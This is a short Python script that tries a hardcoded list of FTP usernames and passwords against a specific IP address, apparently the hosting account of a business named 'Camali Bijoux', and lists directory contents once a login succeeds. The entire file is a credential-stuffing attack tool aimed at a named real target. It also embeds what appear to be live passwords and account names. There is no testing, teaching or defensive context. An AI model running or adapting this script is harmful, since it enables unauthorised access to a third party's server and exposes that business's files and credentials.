import ftplib

passwords = [
    "Q3@5IWcjljKH]:/i",
    "z/T$PJBMmLaNfGR0"
]

users = [
    "u555150082.camalibijoux.com",
    "u555150082.mf",
    "u555150082"
]

host = "82.180.172.16"

print("[*] Testing Camali Bijoux FTP credential combinations...")

found = False
for u in users:
    for p in passwords:
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, 21, timeout=10)
            ftp.login(u, p)
            ftp.set_pasv(True)
            print(f"[+] SUCCESS! User: '{u}' | Pass: '{p}'")
            files = []
            ftp.retrlines("LIST", files.append)
            print("  Files:")
            for f in files[:5]:
                print("   ", f)
            ftp.quit()
            found = True
            break
        except Exception as e:
            print(f"[-] Tried user='{u}', pass='{p}' -> {e}")
    if found:
        break
